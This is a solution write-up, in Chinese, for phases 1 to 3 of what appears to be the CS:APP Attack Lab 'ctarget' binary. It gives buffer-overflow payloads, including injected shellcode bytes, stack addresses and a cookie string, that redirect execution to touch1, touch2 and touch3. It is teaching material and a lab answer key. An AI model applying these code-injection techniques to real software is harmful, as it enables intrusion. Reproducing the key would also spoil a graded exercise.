# CTARGET

## Phase 1

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret

00000000004017c0 <touch1>: ...
```

很明显，getbuf只有0x28就是40的缓冲区，那只要40个垃圾数据+返回地址就行了

NB. 小段序，所以返回地址要倒着写 ie. `c0 17 40 00 00 00 00 00`

```bash
./hex2raw < ans/1.txt | ./ctarget -q
```


## Phase 2

从pdf中可以知道，不但要调用touch2，还要传入的%rdi与cookie相同

需要做的

1. buffer overflow，覆盖掉返回地址
2. 继续覆盖更多内容，植入自己的程序
3. ret返回到自己程序的开头
4. 自己程序设置好环境，再ret touch2()


地址高位

- code (设置rdi，再把当前rsp指向的地址改为touch2地址，然后ret)
- return addr
- getbuf garbage 40 bytes

地址低位

所以代码部分，就是设置好touch()返回地址+寄存器就行了
```asm
0000000000000000 <.text>:
   0:   68 ec 17 40 00          push   $0x4017ec
   5:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   c:   c3                      ret
```

代码部分就是 `68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3`

gdb可以发现，在getbuf返回之前`$rsp   : 0x000000005561dca0`

自己程序的开头就是 rsp+8 = `0x000000005561dca8`



## Phase 3

```asm
00000000004018fa <touch3>: ...
```

```asm
0000000000000000 <.text>:
   0:   68 fa 18 40 00          push   $0x4018fa
   5:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   c:   c3                      ret
```

string形式的cookie `35 39 62 39 39 37 66 61 00` 长度是9

所以string的位置就是rsp+8，因为跳过了返回地址

代码起始位置 rsp+8+9，还跳过了string

ie. `0x5561DCB1` = little endian `b1 dc 61 55 00 00 00 00`

需要输入的字符 (40 bytes random) (ret addr) (string cookie) (code) 

... (b1 dc 61 55 00 00 00 00) (35 39 62 39 39 37 66 61 00) (68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3)
